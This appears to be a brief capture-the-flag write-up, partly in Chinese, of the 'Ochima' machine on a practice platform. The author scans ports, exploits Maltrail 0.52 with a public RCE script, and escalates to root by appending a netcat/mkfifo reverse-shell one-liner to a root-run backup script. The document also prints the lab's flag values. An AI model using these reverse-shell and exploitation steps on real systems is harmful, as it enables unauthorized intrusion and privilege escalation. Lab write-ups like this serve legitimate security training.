###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Ochima
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.182.32 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.182.32:22
Open 192.168.182.32:80
Open 192.168.182.32:8338

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
8338/tcp open  unknown syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: Maltrail/0.52
|     Date: Tue, 02 Apr 2024 06:48:21 GMT
|     Connection: close
|     Content-Type: text/html
|     Last-Modified: Sat, 31 Dec 2022 22:58:57 GMT
|     Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content;
```

google [Maltrail-v0.53-RCE](https://github.com/josephberger/Maltrail-v0.53-RCE)，使用，等反彈，在`/home/snort`可得到local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80

┌──(kali㉿kali)-[~/pgplay]
└─$ python maltrail.py 192.168.45.229 80 http://192.168.182.32:8338/

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
snort@ochima:~$ cat local.txt
13a60aa4dbe6dbeffe6b0a51b7e3bad4
```

用`linpeas.sh`
```
snort@ochima:/tmp$ wget 192.168.45.240:8338/linpeas.sh
snort@ochima:/tmp$ chmod +x linpeas.sh
snort@ochima:/tmp$ ./linpeas.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2023-12-11+12:27:50.1958901560 /var/backups/etc_Backup.sh
...
```

有怪怪的.sh檔就跟上面一樣加入reverse指令，得root，在/root得到proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp8338

snort@ochima:/var/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.240 8338 >/tmp/f" >> etc_Backup.sh

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@ochima:~# cd /root
root@ochima:~# cat proof.txt
cb0837df19f092541d7260a406e8e572
```